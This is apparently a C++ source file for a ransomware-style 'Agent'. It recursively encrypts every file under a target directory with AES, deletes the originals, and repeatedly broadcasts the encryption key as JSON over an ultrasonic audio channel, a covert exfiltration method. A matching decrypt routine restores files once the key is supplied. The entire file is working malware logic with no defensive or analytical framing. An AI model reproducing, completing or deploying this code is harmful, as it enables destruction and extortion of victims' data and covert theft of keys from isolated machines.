#include "Agent.h"
#include "Defines.h"

#include <filesystem>
#include <array>
#include <cassert>
#include <Cryptopp/files.h>
#include <Cryptopp/aes.h>
#include <Cryptopp/modes.h>
#include <Cryptopp/osrng.h>
#include <chrono>
#include <utility>

using namespace std::literals;
using namespace std::filesystem;
using namespace CryptoPP;


Agent::Agent(path encryption_root_path) :
	m_encryption_root_path(std::move(encryption_root_path))
{}

Agent::~Agent()
{
	try {
		m_agent_running = false;
		m_send_key_thread.reset();
		m_ultrasonic_main_thread.reset();
	} catch(...) {
		LOG("Exception in agent dtor");
		assert(true);
	}
}

void Agent::execute()
{
	std::array<byte, AES::DEFAULT_KEYLENGTH> encryption_key(generate_key());
	m_send_key_thread = std::make_unique<std::jthread>([&]()
	{
		send_key(encryption_key);
	});
	
	m_ultrasonic_main_thread = std::make_unique<std::jthread>([&]()
	{
		ultrasonic_main();
	});

	encrypt_directory(encryption_key);
}

void Agent::decrypt(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
{
	for (const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			try {
				{
					const size_t extention_start = entry.path().wstring().find_last_of('.');
					const path final_path = entry.path().wstring().substr(0, extention_start);
					CFB_Mode<AES>::Decryption decryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
					FileSource fsDcr(entry.path().c_str(), true, new StreamTransformationFilter(decryption, new FileSink(final_path.c_str())));
				}

				std::filesystem::remove(entry.path());
			}
			catch (const Exception& ec)
			{
				LOG("Error " + std::string(ec.what()) + " at decrypt file " + entry.path().string());
			}
			catch (...)
			{
				LOG("Unkown error at decrypt file " + entry.path().string());
			}
		}
	}
}

void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
{
	for(const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			try {
				{
					path final_path = entry.path().wstring() + L".encrypted";
					CFB_Mode<AES>::Encryption encryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
					FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
				}
			}
			catch (const Exception& ec)
			{
				LOG("Error " + std::string(ec.what()) + " at encrypt file " + entry.path().string());
			}
			catch (...)
			{
				LOG("Unkown error at encrypt file " + entry.path().string());
			}

			try {
				std::filesystem::remove(entry.path());
			}
			catch (const Exception& ec)
			{
				LOG("Error " + std::string(ec.what()) + " at encrypt when removing file " + entry.path().string());
			}
			catch (...)
			{
				LOG("remove failed");
			}
		}
	}
}

std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
{
	constexpr uint32_t MAX_BYTE_VALUE = 91;
	constexpr uint32_t MIN_BYTE_VALUE = 48;
	AutoSeededRandomPool rng{};
	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};

	for ( uint32_t i = 0; i< key.size(); ++i )
	{
		key[i] = (rng.GenerateByte() % (MAX_BYTE_VALUE - MIN_BYTE_VALUE + 1)) + MIN_BYTE_VALUE;
	}

	return key;
}

void Agent::ultrasonic_main()
{
	while (m_agent_running) {
		std::this_thread::sleep_for(1ms);

		{
			std::lock_guard lock(m_ultrasonic_mutex);
			m_ultrasonic.run_logic();
		}
	}
}

void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key)
{
	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
	constexpr int VOLUME = 10;
	constexpr std::chrono::duration SLEEP_TIME = 30s;
	
	std::string encryption_data = "{ \"agentIp\": \"10.0.0.5\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"" + std::string(encryption_key.begin(), encryption_key.end()) +"\\\"}\" }";
	auto ggWave = m_ultrasonic.get_ggwave();

	while (m_agent_running) {
		{
			std::lock_guard lock(m_ultrasonic_mutex);
			ggWave->init(encryption_data.size(), encryption_data.data(), ggWave->getTxProtocol(TX_PROTOCOL), VOLUME);
		}

		std::this_thread::sleep_for(SLEEP_TIME);
	}
}
